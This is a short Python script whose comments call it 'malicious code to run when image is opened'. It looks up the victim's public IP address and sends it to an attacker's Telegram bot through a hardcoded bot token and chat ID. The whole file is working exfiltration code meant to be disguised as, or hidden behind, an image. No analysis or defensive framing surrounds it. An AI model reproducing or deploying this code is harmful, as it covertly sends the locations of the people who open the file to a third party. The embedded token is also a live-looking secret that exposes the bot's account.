import requests
import socket
import os

# Function to get the public IP address
def get_public_ip():
    ip = requests.get('https://api.ipify.org').text
    return ip

# Function to send IP address to Telegram bot
def send_to_telegram(ip):
    bot_token = '7094424737:AAHLDsvgMgS8didDx1s2u9Qx_FuPZXhH7-8'
    chat_id = '5607020586'
    message = f'IP Address Detected: {ip}'
    requests.get(f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}')

# Malicious code to run when image is opened
def malicious_code():
    ip = get_public_ip()
    send_to_telegram(ip)

# Main code to run when image is opened
if __name__ == "__main__":
    malicious_code()
